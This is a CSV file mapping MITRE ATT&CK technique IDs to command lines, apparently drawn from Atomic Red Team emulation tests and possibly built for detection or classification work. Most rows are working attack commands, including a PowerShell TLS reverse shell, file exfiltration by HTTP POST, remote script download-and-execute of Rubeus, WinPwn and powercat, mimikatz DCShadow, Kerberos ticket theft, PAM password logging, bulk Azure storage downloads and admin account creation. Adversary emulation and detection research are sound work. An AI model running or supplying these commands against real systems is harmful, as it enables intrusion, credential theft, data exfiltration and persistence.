mitre_id,command
T1005,"osascript -e 'tell application ""finder""' -e 'set destinationfolderpath to posix file ""#{destination_path}""' -e 'set notesfolderpath to (path to home folder as text) & ""library:group containers:group.com.apple.notes:""' -e 'set notesfolder to folder notesfolderpath' -e 'set notesfiles to {file ""notestore.sqlite"", file ""notestore.sqlite-shm"", file ""notestore.sqlite-wal""} of notesfolder' -e 'repeat with afile in notesfiles' -e 'duplicate afile to folder destinationfolderpath with replacing' -e 'end' -e 'end tell'  "
T1087,"cd ""pathtoatomicsfolder\..\externalpayloads"" .\kerbrute.exe userenum -d #{domain} --dc #{domaincontroller} ""pathtoatomicsfolder\..\externalpayloads\username.txt"" "
T1654,powershell -c {get-eventlog 'security' | where {$_.message -like '*system*'} | export-csv $env:temp\t1654_events.txt}
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe"" --pipe 2"
T1651,"import-module ""pathtoatomicsfolder/t1651/src/t1651-1/awsssmattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") "
T1489,sudo kill -sigterm $(pgrep #{process_name})
T1124,time   
T1033,[system.environment]::username | out-file -filepath .\currentactiveuser.txt $env:username | out-file -filepath .\currentactiveuser.txt -append
T1615,get-gpo -domain $env:userdnsdomain #{gpo_param} >> #{gpo_output} # id_5455
T1218,#{regsvr32path}\#{regsvr32name} /s /u /i:#{url} scrobj.dll
T1526,"import-module ""pathtoatomicsfolder\t1526\src\awsdiscovery.ps1"" $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $regions = ""#{regions}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile get-awsdiscoverydata -regions $regions -outputdirectory ""#{output_directory}"" remove-blankfiles -outputdirectory ""#{output_directory}"" # id_4439"
T1134,cmd /c '#{potato_path}' -l '#{listening_port}' -t * -p '#{target_exe}' -c '#{target_clsid}' 
T1176,"# chromium $chromium = ""https://commondatastorage.googleapis.com/chromium-browser-snapshots/win_x64/1153778/chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https://github.com/ublockorigin/ubol-home/releases/download/ubolite_2024.11.25.1376/ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""#{working_dir}"" set-variable progresspreference silentlycontinue invoke-webrequest -uri $chromium -outfile ""#{working_dir}\chrome.zip"" invoke-webrequest -uri $extension -outfile ""#{working_dir}\extension.zip"" expand-archive chrome.zip -destinationpath ""#{working_dir}"" -force expand-archive extension.zip -force start-process .\chrome-win\chrome.exe --load-extension=""#{working_dir}\extension\"" -passthru"
T1047,"$class = new-object management.managementclass(new-object management.managementpath(""win32_process"")) $newclass = $class.derive(""#{new_class}"") $newclass.put() invoke-wmimethod -path #{new_class} -name create -argumentlist #{process_to_execute} # id_2417"
T1039,"copy-item -path ""\\#{remote}\c$\#{share_file}"" -destination ""$env:temp\#{local_file}"""
T1069,"net localgroup net localgroup ""administrators"""
T1207,"# STARTING FAKE DC SERVER, AS SYSTEM (REQUIRED) $DC_OUTPUT_FILE = ""PATHTOATOMICSFOLDER\..\EXTERNALPAYLOADS\ART-T1207-MIMIKATZ-DC.LOG"" REMOVE-ITEM $DC_OUTPUT_FILE -ERRORACTION IGNORE $MIMIKATZPARAM =""`""LOG $DC_OUTPUT_FILE`"" `""LSADUMP::DCSHADOW /OBJECT:#{OBJECT} /ATTRIBUTE:#{ATTRIBUTE} /VALUE:#{VALUE}`"" `""EXIT`"""" $DC = START-PROCESS -FILEPATH CMD.EXE -VERB RUNAS -ARGUMENTLIST ""/C '#{PSEXEC_PATH}' /ACCEPTEULA -D -S #{MIMIKATZ_PATH} $MIMIKATZPARAM"" # WAIT FOR FAKE DC SERVER TO BE READY... START-SLEEP -SECONDS 5 # SERVER READY, SO TRIGGER REPLICATION (PUSH) AND WAIT UNTIL IT FINISHED & ""#{MIMIKATZ_PATH}"" ""LSADUMP::DCSHADOW /PUSH"" ""EXIT"" WRITE-HOST ""`NWAITING FOR FAKE DC SERVER TO RETURN"" WAIT-PROCESS $DC WRITE-HOST ""`NOUTPUT FROM FAKE DC SERVER:"" GET-CONTENT $DC_OUTPUT_FILE START-SLEEP 1 # WAIT A LITTLE UNTIL THE FILE IS NOT LOCKED ANYMORE SO WE CAN ACTUALLY DELETE IT REMOVE-ITEM $DC_OUTPUT_FILE -ERRORACTION IGNORE WRITE-HOST ""END OF DCSHADOW"""
T1558,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-rubeus.ps1') invoke-rubeus -command ""asreproast /format:hashcat /nowrap"""
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive/t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }"
T1497,ping -c #{ping_count} 8.8.8.8 > /dev/null #{evil_command}
T1552,type c:\windows\panther\unattend.xml type c:\windows\panther\unattend\unattend.xml   
T1550,"& ""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" -accepteula \\#{target} -w c:\ -c ""pathtoatomicsfolder\..\externalpayloads\rubeus.exe"" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi set-location ""pathtoatomicsfolder\..\externalpayloads"" move-item -force ""\\#{target}\c$\ticket.kirbi"" ticket.kirbi write-host ""successfully retrieved tgt from '#{target}', now requesting a tgs from local"" & ""pathtoatomicsfolder\..\externalpayloads\rubeus.exe"" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt remove-item ""pathtoatomicsfolder\..\externalpayloads\ticket.kirbi"" & ""pathtoatomicsfolder\..\externalpayloads\rubeus.exe"" purge # id_9629"
T1135,df -ah smbutil view -g //#{computer_name} showmount #{computer_name} # id_3243
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe /k tscon #{session_id} /dest:#{destination_id}"" net start sesshijack # id_6868"
T1570,net use * '#{remote_path}' /transport:quic /skipcertcheck copy '#{local_file}' '*:\'   
T1574,"write-host ""creating registry keys in hkcu:software\classes\clsid\#{clsid_guid}"" -foregroundcolor cyan new-item -path ""hkcu:\software\classes\clsid\#{clsid_guid}\inprocserver32"" -value ""#{file_name}"" -force | out-null new-itemproperty -path hkcu:\environment -name ""cor_enable_profiling"" -propertytype string -value ""1"" -force | out-null new-itemproperty -path hkcu:\environment -name ""cor_profiler"" -propertytype string -value ""#{clsid_guid}"" -force | out-null new-itemproperty -path hkcu:\environment -name ""cor_profiler_path"" -propertytype string -value ""#{file_name}"" -force | out-null write-host ""executing eventvwr.msc"" -foregroundcolor cyan start mmc.exe eventvwr.msc"
T1037,"echo ""#{script_command}"" > #{script_path} reg.exe add hkcu\environment /v userinitmprlogonscript /t reg_sz /d ""#{script_path}"" /f"
T1570,net use * '#{remote_path}' /transport:quic /skipcertcheck copy '#{local_file}' '*:\'
T1016,test-netconnection -computername #{target} # id_1062
T1046,"$ipaddr = ""#{ip_address}"" if ($ipaddr -like ""*,*"") { $ip_list = $ipaddr -split "","" $ip_list = $ip_list.foreach({ $_.trim() }) write-host ""[i] ip address list: $ip_list"" $ports = #{port_list} foreach ($ip in $ip_list) { foreach ($port in $ports) { write-host ""[i] establishing connection to: $ip : $port"" try { $tcp = new-object net.sockets.tcpclient $tcp.connectasync($ip, $port).wait(#{timeout_ms}) | out-null } catch {} if ($tcp.connected) { $tcp.close() write-host ""port $port is open on $ip"" } } } } elseif ($ipaddr -notlike ""*,*"") { if ($ipaddr -eq """") { # assumes the ""primary"" interface is shown at the top $interface = get-netipinterface -addressfamily ipv4 -connectionstate connected | select-object -expandproperty interfacealias -first 1 write-host ""[i] using interface $interface"" $ipaddr = get-netipaddress -addressfamily ipv4 -interfacealias $interface | select-object -expandproperty ipaddress } write-host ""[i] base ip-address for subnet: $ipaddr"" $subnetsubstring = $ipaddr.substring(0, $ipaddr.lastindexof('.') + 1) # always assumes /24 subnet write-host ""[i] assuming /24 subnet. scanning $subnetsubstring'1' to $subnetsubstring'254'"" $ports = #{port_list} $subnetips = 1..254 | foreach-object { ""$subnetsubstring$_"" } foreach ($ip in $subnetips) { foreach ($port in $ports) { try { $tcp = new-object net.sockets.tcpclient $tcp.connectasync($ip, $port).wait(#{timeout_ms}) | out-null } catch {} if ($tcp.connected) { $tcp.close() write-host ""port $port is open on $ip"" } } } } else { write-host ""[error] invalid inputs"" exit 1 }"
T1482,"import-module ""pathtoatomicsfolder\..\externalpayloads\powerview.ps1"" get-netdomaintrust get-netforesttrust get-addomain get-adgroupmember administrators -recursive ([system.directoryservices.activedirectory.domain]::getcurrentdomain()).getalltrustrelationships()"
T1070,sshpass -p 'pwd101!' ssh testuser1@localhost -t hostname
T1041,"IF(-NOT (TEST-PATH #{FILEPATH})){ 1..100 | FOREACH-OBJECT { ADD-CONTENT -PATH #{FILEPATH} -VALUE ""THIS IS LINE $_."" } } [SYSTEM.NET.SERVICEPOINTMANAGER]::EXPECT100CONTINUE = $FALSE $FILECONTENT = GET-CONTENT -PATH #{FILEPATH} INVOKE-WEBREQUEST -URI #{DESTINATION_URL} -METHOD POST -BODY $FILECONTENT -DISABLEKEEPALIVE"
T1033,[system.security.principal.windowsidentity]::getcurrent() | out-file -filepath .\currentuserobject.txt  
T1036,"copy ""#{inputfile}"" #{outputfile} $myt1036_003 = (start-process -passthru -filepath #{outputfile}).id stop-process -id $myt1036_003"
T1204,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""#{jse_path}`"" for output as #1`n write #1, `""wscript.quit`""`n close #1`n shell`$ `""cscript.exe #{jse_path}`""`n"" invoke-maldoc -macrocode $macrocode -officeproduct ""#{ms_product}""  "
T1176,"# chromium $chromium = ""https://commondatastorage.googleapis.com/chromium-browser-snapshots/win_x64/1153778/chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https://github.com/ublockorigin/ubol-home/releases/download/ubolite_2024.11.25.1376/ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""#{working_dir}"" set-variable progresspreference silentlycontinue invoke-webrequest -uri $chromium -outfile ""#{working_dir}\chrome.zip"" invoke-webrequest -uri $extension -outfile ""#{working_dir}\extension.zip"" expand-archive chrome.zip -destinationpath ""#{working_dir}"" -force expand-archive extension.zip -force start-process .\chrome-win\chrome.exe --load-extension=""#{working_dir}\extension\"" -passthru"
T1071,"curl -s -a ""httpbrowser/1.0"" -m3 #{domain} curl -s -a ""wget/1.9+cvs-stable (red hat modified)"" -m3 #{domain} curl -s -a ""opera/8.81 (windows nt 6.0; u; en)"" -m3 #{domain} curl -s -a ""*<|>*"" -m3 #{domain} # id_6768"
T1569,launchctl submit -l #{label_name} -- #{executable_path} 
T1505,"$TERMSRVDLL = ""C:\WINDOWS\SYSTEM32\TERMSRV.DLL"" $ACL = GET-ACL $TERMSRVDLL $PERMISSION = ""ADMINISTRATORS"",""FULLCONTROL"",""ALLOW"" $ACCESSRULE = NEW-OBJECT SYSTEM.SECURITY.ACCESSCONTROL.FILESYSTEMACCESSRULE $PERMISSION $ACL.SETACCESSRULE($ACCESSRULE) SET-ACL -PATH $TERMSRVDLL -ACLOBJECT $ACL COPY-ITEM -PATH $TERMSRVDLL -DESTINATION ""$HOME\ATOMICTEST.DLL"" $NEWSERVICEDLL = ""$HOME\ATOMICTEST.DLL"" $REGISTRYPATH = ""HKLM:\SYSTEM\CURRENTCONTROLSET\SERVICES\TERMSERVICE\PARAMETERS"" # CHECK IF THE REGISTRY KEY EXISTS IF (TEST-PATH -PATH $REGISTRYPATH) { # MODIFY THE SERVICEDLL VALUE IN THE REGISTRY SET-ITEMPROPERTY -PATH $REGISTRYPATH -NAME ""SERVICEDLL"" -VALUE $NEWSERVICEDLL WRITE-HOST ""SERVICEDLL VALUE IN THE REGISTRY HAS BEEN UPDATED TO: $NEWSERVICEDLL"" } ELSE { WRITE-HOST ""REGISTRY KEY NOT FOUND. MAKE SURE THE 'TERMSERVICE\PARAMETERS' KEY EXISTS."" }"
T1033,"$tokenset = @{ u = [char[]]'abcdefghijklmnopqrstuvwxyz' n = [char[]]'0123456789' } $upper = get-random -count 5 -inputobject $tokenset.u $number = get-random -count 5 -inputobject $tokenset.n $stringset = $upper + $number $rad = (get-random -count 5 -inputobject $stringset) -join '' $file = ""rad"" + $rad + "".tmp"" whoami.exe /all >> #{output_path}\$file # id_7682"
T1134,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/bc-security/empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/get-system.ps1' -usebasicparsing); get-system -technique token -verbose
T1530,"$STORAGE_ACCOUNT_OBJECTS = IMPORT-CSV -PATH ""#{STORAGE_ACCOUNT_OBJECTS_CSV_FILE_PATH}"" # LOGIN TO AZURE AZ LOGIN IF (-NOT (TEST-PATH -PATH ""#{OUTPUT_FOLDER}"")) { NEW-ITEM -ITEMTYPE DIRECTORY -PATH ""#{OUTPUT_FOLDER}"" } FOREACH ($ROW IN $STORAGE_ACCOUNT_OBJECTS) { IF ($ROW.FILESHARENAME -NE """"){ $ALLOWSHAREDKEYACCESS = AZ STORAGE ACCOUNT SHOW --NAME $ROW.STORAGEACCOUNTNAME --RESOURCE-GROUP $ROW.RESOURCEGROUP --QUERY ""ALLOWSHAREDKEYACCESS"" IF ($ALLOWSHAREDKEYACCESS -EQ ""FALSE"") { # $ALLOWSHAREDKEYACCESS COULD BE TRUE OR NULL WRITE-OUTPUT ""SHARED KEY ACCESS IS DISABLED FOR THIS STORAGE ACCOUNT."" } ELSE { WRITE-OUTPUT ""FETCHING CONTENT FROM FILE SHARE: $($ROW.FILESHARENAME) IN STORAGE ACCOUNT $($ROW.STORAGEACCOUNTNAME) ..."" $CONNECTIONSTRING = AZ STORAGE ACCOUNT SHOW-CONNECTION-STRING --NAME $ROW.STORAGEACCOUNTNAME --RESOURCE-GROUP $ROW.RESOURCEGROUP --QUERY CONNECTIONSTRING --OUTPUT TSV # CREATE FOLDER FOR STORAGE ACCOUNT OBJECTS $STORAGEACCOUNTOUTPUTPATH = JOIN-PATH #{OUTPUT_FOLDER} ""$($ROW.RESOURCEGROUP)_$($ROW.STORAGEACCOUNTNAME)"" IF (-NOT (TEST-PATH -PATH $STORAGEACCOUNTOUTPUTPATH)) { NEW-ITEM -ITEMTYPE DIRECTORY -PATH $STORAGEACCOUNTOUTPUTPATH } # CREATE FOLDER FOR FILE SHARE CONTENT $FILESHAREPATH = JOIN-PATH -PATH $STORAGEACCOUNTOUTPUTPATH $ROW.FILESHARENAME IF (-NOT (TEST-PATH -PATH $FILESHAREPATH)) { NEW-ITEM -ITEMTYPE DIRECTORY -PATH $FILESHAREPATH } AZ STORAGE FILE DOWNLOAD-BATCH --CONNECTION-STRING $CONNECTIONSTRING --SOURCE $ROW.FILESHARENAME --DESTINATION $FILESHAREPATH } } ELSEIF ($ROW.CONTAINERNAME -NE """" -AND $ROW.BLOBNAME -EQ """") { $ALLOWSHAREDKEYACCESS = AZ STORAGE ACCOUNT SHOW --NAME $ROW.STORAGEACCOUNTNAME --RESOURCE-GROUP $ROW.RESOURCEGROUP --QUERY ""ALLOWSHAREDKEYACCESS"" IF ($ALLOWSHAREDKEYACCESS -EQ ""FALSE"") { # $ALLOWSHAREDKEYACCESS COULD BE TRUE OR NULL WRITE-OUTPUT ""SHARED KEY ACCESS IS DISABLED FOR THIS STORAGE ACCOUNT."" } ELSE { WRITE-OUTPUT ""FETCHING ALL BLOBS FROM CONTAINER $($ROW.CONTAINERNAME) IN STORAGE ACCOUNT $($ROW.STORAGEACCOUNTNAME) ..."" $CONNECTIONSTRING = AZ STORAGE ACCOUNT SHOW-CONNECTION-STRING --NAME $ROW.STORAGEACCOUNTNAME --RESOURCE-GROUP $ROW.RESOURCEGROUP --QUERY CONNECTIONSTRING --OUTPUT TSV # CREATE FOLDER FOR STORAGE ACCOUNT OBJECTS $STORAGEACCOUNTOUTPUTPATH = JOIN-PATH #{OUTPUT_FOLDER} ""$($ROW.RESOURCEGROUP)_$($ROW.STORAGEACCOUNTNAME)"" IF (-NOT (TEST-PATH -PATH $STORAGEACCOUNTOUTPUTPATH)) { NEW-ITEM -ITEMTYPE DIRECTORY -PATH $STORAGEACCOUNTOUTPUTPATH } # CREATE FOLDER FOR BLOB CONTENT $CONTAINERFOLDERPATH = JOIN-PATH $STORAGEACCOUNTOUTPUTPATH $ROW.CONTAINERNAME IF (-NOT (TEST-PATH -PATH $CONTAINERFOLDERPATH)) { NEW-ITEM -ITEMTYPE DIRECTORY -PATH $CONTAINERFOLDERPATH } AZ STORAGE BLOB DOWNLOAD-BATCH --DESTINATION $CONTAINERFOLDERPATH --SOURCE $ROW.CONTAINERNAME --CONNECTION-STRING $CONNECTIONSTRING } } }"
T1114,"powershell -executionpolicy bypass -command ""#{file_path}\get-inbox.ps1"" -file #{output_file} # id_7125"
T1082,$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-sharpwatson.ps1') invoke-watson # id_5086
T1219,"START-PROCESS ""#{AMMYY_ADMIN_PATH}"""
T1531,"az login $userprincipalname = ""#{userprincipalname}"" az ad user delete --id $userprincipalname"
T1106,IEX(NEW-OBJECT NET.WEBCLIENT).DOWNLOADSTRING('HTTPS://RAW.GITHUBUSERCONTENT.COM/S3CUR3TH1SSH1T/GET-SYSTEM-TECHNIQUES/MASTER/NAMEDPIPE/NAMEDPIPESYSTEM.PS1')
T1486,$which_7z a -p#{pwd_for_encrypted_file} #{encrypted_file_path} #{input_file_path}
T1648,"import-module ""pathtoatomicsfolder/t1648/src/t1648-1/lambdaattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region  "
T1134,start-athprocessunderspecificparent -filepath #{file_path} -commandline '#{command_line}' -parentid #{parent_pid}
T1082,"echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{cli_script}"""
T1069,"net localgroup net group /domain net group ""enterprise admins"" /domain net group ""domain admins"" /domain"
T1496,yes > /dev/null
T1518,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') powersql -noninteractive -consoleoutput
T1530,"$storage_account_objects = import-csv -path ""#{storage_account_objects_csv_file_path}"" # login to azure az login if (-not (test-path -path ""#{output_folder}"")) { new-item -itemtype directory -path ""#{output_folder}"" } foreach ($row in $storage_account_objects) { if ($row.filesharename -ne """"){ $allowsharedkeyaccess = az storage account show --name $row.storageaccountname --resource-group $row.resourcegroup --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { write-output ""fetching content from file share: $($row.filesharename) in storage account $($row.storageaccountname) ..."" $connectionstring = az storage account show-connection-string --name $row.storageaccountname --resource-group $row.resourcegroup --query connectionstring --output tsv # create folder for storage account objects $storageaccountoutputpath = join-path #{output_folder} ""$($row.resourcegroup)_$($row.storageaccountname)"" if (-not (test-path -path $storageaccountoutputpath)) { new-item -itemtype directory -path $storageaccountoutputpath } # create folder for file share content $filesharepath = join-path -path $storageaccountoutputpath $row.filesharename if (-not (test-path -path $filesharepath)) { new-item -itemtype directory -path $filesharepath } az storage file download-batch --connection-string $connectionstring --source $row.filesharename --destination $filesharepath } } elseif ($row.containername -ne """" -and $row.blobname -eq """") { $allowsharedkeyaccess = az storage account show --name $row.storageaccountname --resource-group $row.resourcegroup --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { write-output ""fetching all blobs from container $($row.containername) in storage account $($row.storageaccountname) ..."" $connectionstring = az storage account show-connection-string --name $row.storageaccountname --resource-group $row.resourcegroup --query connectionstring --output tsv # create folder for storage account objects $storageaccountoutputpath = join-path #{output_folder} ""$($row.resourcegroup)_$($row.storageaccountname)"" if (-not (test-path -path $storageaccountoutputpath)) { new-item -itemtype directory -path $storageaccountoutputpath } # create folder for blob content $containerfolderpath = join-path $storageaccountoutputpath $row.containername if (-not (test-path -path $containerfolderpath)) { new-item -itemtype directory -path $containerfolderpath } az storage blob download-batch --destination $containerfolderpath --source $row.containername --connection-string $connectionstring } } } # id_6957"
T1036,"copy ""#{exe_path}"" %temp%\t1036.007_masquerading.docx.exe /y copy ""#{exe_path}"" %temp%\t1036.007_masquerading.pdf.exe /y copy ""#{exe_path}"" %temp%\t1036.007_masquerading.ps1.exe /y copy ""#{vbs_path}"" %temp%\t1036.007_masquerading.xls.vbs /y copy ""#{vbs_path}"" %temp%\t1036.007_masquerading.xlsx.vbs /y copy ""#{vbs_path}"" %temp%\t1036.007_masquerading.png.vbs /y copy ""#{ps1_path}"" %temp%\t1036.007_masquerading.doc.ps1 /y copy ""#{ps1_path}"" %temp%\t1036.007_masquerading.pdf.ps1 /y copy ""#{ps1_path}"" %temp%\t1036.007_masquerading.rtf.ps1 /y %temp%\t1036.007_masquerading.docx.exe %temp%\t1036.007_masquerading.pdf.exe %temp%\t1036.007_masquerading.ps1.exe %temp%\t1036.007_masquerading.xls.vbs %temp%\t1036.007_masquerading.xlsx.vbs %temp%\t1036.007_masquerading.png.vbs c:\windows\system32\windowspowershell\v1.0\powershell.exe -file %temp%\t1036.007_masquerading.doc.ps1 c:\windows\system32\windowspowershell\v1.0\powershell.exe -file %temp%\t1036.007_masquerading.pdf.ps1 c:\windows\system32\windowspowershell\v1.0\powershell.exe -file %temp%\t1036.007_masquerading.rtf.ps1   "
T1140,"encoded=$(perl -e ""use mime::base64;print(encode_base64('#{message}'));"") perl -le ""use mime::base64;print(decode_base64('$encoded'));"" echo $encoded | perl -le 'use mime::base64;print(decode_base64(<stdin>));' echo $encoded > #{encoded_file} && perl -le 'use mime::base64;open($f,""<"",""#{encoded_file}"");print(decode_base64(<$f>));'"
T1056,"if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk sudo touch /tmp/system-auth.bk sudo echo ""session required pam_tty_audit.so enable=* log_password"" >> /etc/pam.d/password-auth sudo echo ""session required pam_tty_audit.so enable=* log_password"" >> /etc/pam.d/system-auth # id_4310"
T1083,ls -recurse get-childitem -recurse gci -recurse
T1012,REG QUERY HKCU\SOFTWARE\POLICIES\MICROSOFT\WINDOWS\INSTALLER /V ALWAYSINSTALLELEVATED REG QUERY HKLM\SOFTWARE\POLICIES\MICROSOFT\WINDOWS\INSTALLER /V ALWAYSINSTALLELEVATED
T1562,"test=$(echo $histcontrol) if [ ""$histcontrol"" != ""ignoreboth"" ]; then export histcontrol=""ignoreboth""; fi history -c ls -la $histfile # "" ls -la $histfile"" if [ $(history |wc -l) -eq 1 ]; then echo ""ls -la is not in history cache""; fi if [ ""$histcontrol"" != ""erasedups"" ]; then export histcontrol=""erasedups""; fi history -c ls -la $histfile ls -la $histfile ls -la $histfile if [ $(history |wc -l) -eq 2 ]; then echo ""their is only one entry for ls -la $histfile""; fi"
T1573,"$SERVER_IP = #{SERVER_IP} $SERVER_PORT = #{SERVER_PORT} $SOCKET = NEW-OBJECT NET.SOCKETS.TCPCLIENT('#{SERVER_IP}', '#{SERVER_PORT}') $STREAM = $SOCKET.GETSTREAM() $SSLSTREAM = NEW-OBJECT SYSTEM.NET.SECURITY.SSLSTREAM($STREAM,$FALSE,({$TRUE} -AS [NET.SECURITY.REMOTECERTIFICATEVALIDATIONCALLBACK])) $SSLSTREAM.AUTHENTICATEASCLIENT('FAKEDOMAIN.EXAMPLE', $NULL, ""TLS12"", $FALSE) $WRITER = NEW-OBJECT SYSTEM.IO.STREAMWRITER($SSLSTREAM) $WRITER.WRITE('PS ' + (PWD).PATH + '> ') $WRITER.FLUSH() [BYTE[]]$BYTES = 0..65535|%{0}; WHILE(($I = $SSLSTREAM.READ($BYTES, 0, $BYTES.LENGTH)) -NE 0) {$DATA = (NEW-OBJECT -TYPENAME SYSTEM.TEXT.ASCIIENCODING).GETSTRING($BYTES,0, $I); $SENDBACK = (IEX $DATA | OUT-STRING ) 2>&1; $SENDBACK2 = $SENDBACK + 'PS ' + (PWD).PATH + '> '; $SENDBYTE = ([TEXT.ENCODING]::ASCII).GETBYTES($SENDBACK2); $SSLSTREAM.WRITE($SENDBYTE,0,$SENDBYTE.LENGTH);$SSLSTREAM.FLUSH()}"
T1529,halt -p # id_5731
T1569,"sc.exe create #{service_name} binpath= ""#{executable_command}"" sc.exe start #{service_name} sc.exe delete #{service_name}"
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f # id_3018
T1095,iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1') powercat -c #{server_ip} -p #{server_port}
T1187,rpcping -s #{server_ip} -e #{custom_port} /a connect /u ntlm 1>$null # id_3688
T1136,"net user /add ""#{username}"" ""#{password}"" net localgroup administrators ""#{username}"" /add"
T1220,"""#{msxsl_exe}"" ""#{xmlfile}"" ""#{xslfile}"" # id_4837"
T1053,"crontab -l > /tmp/notevil echo ""* * * * * #{command}"" > #{tmp_cron} && crontab #{tmp_cron}"
T1082,"powershell.exe -c ""gdr -psprovider 'filesystem'"" "
T1124,date # id_8540
